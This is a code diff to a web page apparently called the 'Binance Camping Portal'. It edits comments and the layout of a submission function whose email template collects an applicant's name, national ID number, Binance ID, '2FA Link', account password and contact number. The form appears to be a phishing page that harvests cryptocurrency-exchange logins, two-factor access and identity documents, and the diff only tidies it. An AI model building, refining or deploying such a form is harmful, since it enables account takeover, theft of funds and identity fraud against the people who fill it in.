@@ -348,7 +348,7 @@
       border-color: var(--primary);
     }
 
-    /* Updated 4-Column Priority Options Grid */
+    /* 4-Column Priority Options Grid */
     .priority-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
@@ -668,7 +668,7 @@
       if (val === "Rejected") btn.classList.add("rejected-opt");
     }
 
-    // Form Submission & Formatted Email Creation
+    // Form Submission & Formatted Email Creation (Original Clean Template)
     function submitApplication(e) {
       e.preventDefault();
 
@@ -680,18 +680,17 @@
       const contact = document.getElementById("mContact").value.trim();
       const priority = document.getElementById("mPriority").value;
 
-      // Structured Email Body Template
+      // Clean Structured Message Body (Original)
       const bodyText = 
 `Binance Camping Application Details:
 ----------------------------------------
-Applicant Email : [Sender Email - Attached via Client]
-Name (NID)      : ${name}
-NID Number      : ${nid}
-Binance ID      : ${binanceId}
-2FA Link        : ${twoFa}
-Password        : ${pass}
-Contact Number  : ${contact}
-Priority        : ${priority}
+Name (NID)     : ${name}
+NID Number     : ${nid}
+Binance ID     : ${binanceId}
+2FA Link       : ${twoFa}
+Password       : ${pass}
+Contact Number : ${contact}
+Priority       : ${priority}
 ----------------------------------------
 Submitted via Binance Camping Portal`;
 
@@ -707,5 +706,4 @@ Submitted via Binance Camping Portal`;
   </script>
 
 </body>
-  </html>
-  
+</html>
